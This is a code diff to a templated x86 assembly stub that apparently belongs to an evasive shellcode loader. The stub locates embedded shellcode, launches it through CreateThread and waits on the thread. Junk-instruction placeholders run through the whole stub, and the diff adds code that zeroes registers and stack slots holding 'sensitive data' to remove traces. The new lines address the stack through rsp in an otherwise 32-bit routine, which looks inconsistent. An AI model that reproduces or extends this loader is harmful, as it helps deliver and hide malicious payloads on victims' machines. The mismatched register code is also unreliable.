@@ -415,6 +415,7 @@ entry:
     add {{.RegV.ecx}}, {{hex .EntryOffset}}    {{igi}} // address of shellcode
     xor {{.RegV.edx}}, {{.RegV.edx}}           {{igi}} // clear register for lpParameter
   {{end}}
+
   xor {{.RegV.eax}}, {{.RegV.eax}}             {{igi}} // clear register for push 0
   push {{.RegV.eax}}                           {{igi}} // lpThreadId
   push {{.RegV.eax}}                           {{igi}} // dwCreationFlags
@@ -424,6 +425,7 @@ entry:
   push {{.RegV.eax}}                           {{igi}} // lpThreadAttributes
   mov {{.RegV.eax}}, [esp+0x2C]                {{igi}} // address of CreateThread
   call {{.RegV.eax}}                           {{igi}} // call CreateThread
+
   {{if .NeedWaitThread}}
     mov edx, 0xFFFFFFFF                        {{igi}} // dwMilliseconds, INFINITE
     push edx                                   {{igi}} // push argument
@@ -474,8 +476,22 @@ entry:
 
 // ================================== clean environment ==================================
 
+  // clear volatile register that store sensitive data
+  xor {{.RegN.edi}}, {{.RegN.edi}}                             {{igi}}
+  xor {{.RegN.esi}}, {{.RegN.esi}}                             {{igi}}
+  xor {{.RegN.ebx}}, {{.RegN.ebx}}                             {{igi}}
+  xor {{.RegN.ebp}}, {{.RegN.ebp}}                             {{igi}}
+
+  // clear stack that store sensitive data
+  mov [rsp+0x04], {{.RegN.edi}}                                {{igi}}
+  mov [rsp+0x08], {{.RegN.esi}}                                {{igi}}
+  mov [rsp+0x0C], {{.RegN.ebx}}                                {{igi}}
+  mov [rsp+0x10], {{.RegN.ebp}}                                {{igi}}
+  mov [rsp+0x14], {{.RegN.edi}}                                {{igi}}
+  mov [rsp+0x18], {{.RegN.esi}}                                {{igi}}
+
   // restore stack for store variables
-  add esp, 0x2C
+  add esp, 0x2C                                                {{igi}}
 
   // restore stack and ebp
   pop ebp                                                      {{igi}}
